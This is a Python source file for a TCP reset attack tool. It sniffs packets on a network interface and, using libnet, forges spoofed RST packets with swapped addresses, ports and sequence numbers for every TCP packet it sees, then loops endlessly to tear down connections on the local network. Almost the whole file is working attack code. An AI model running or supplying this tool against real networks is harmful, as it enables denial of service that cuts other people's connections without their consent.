#! /usr/bin/env python

"""
In the future i need to a support for ipv6 resetting
"""

import os
import socket
import libnet
import base64
import random
from libnet.constants import *
os.sys.path.append(os.path.dirname(os.path.abspath('.'))) #fix import path
from sniffer.sniffer import Sniffer

class TCP_Hijack(object):
    """this will perform a tcp hijacking"""
    def __init__(self, arg):
        super(TCP_Hijack, self).__init__()
        self.iface = arg
        self.sniffer = Sniffer()
        self.sniffer.init(self.iface)
        self.unique_id = base64.b64encode(str(random.randint(0, 10000)))

    def pkt_builder(self, packet):
        self.wire = libnet.context(LINK, self.iface)
        tcptag = self.wire.build_tcp(
                                     dp      = packet['TCP_SPORT'],
                                     sp      = packet['TCP_DPORT'],
                                     control = TH_RST,
                                     seq     = packet['TCP_ACK_NUM'],
                                     ack     = packet['TCP_SEQ_NUM']+1,
                                     payload = self.unique_id
                                    )

        iptag = self.wire.build_ipv4(
                                     prot = IPPROTO_TCP,
                                     dst  = socket.inet_aton(packet['IP_SRC']),
                                     src  = socket.inet_aton(packet['IP_DST'])
                                    )

        ethtag = self.wire.build_ethernet(
                                          dst = self.wire.hex_aton(packet['ETH_SHOST']),
                                          src = self.wire.hex_aton(packet['ETH_DHOST'])
                                         )

    def reset(self, packet):
        self.wire.write()
        bytes_written = self.wire.stats()['bytes_written']
        print("({}, {}, {})".format(bytes_written, packet['IP_SRC'], packet['IP_DST']))
        del self.wire

    def pkt_handle(self, packet):
        try:
            if packet['IP_PROTO'] == IPPROTO_TCP:
                if self.unique_id not in packet['TCP_PAYLOAD']:
                    self.pkt_builder(packet)
                    self.reset(packet)
        except KeyError: return -1

    def kill(self):
        while True:
            self.pkt_handle(self.sniffer.sniff())

if __name__ == '__main__':
    tcp = TCP_Hijack("wlp3s0")
    print("tcpHijack on {} with id {}".format(tcp.iface, tcp.unique_id))
    tcp.kill()
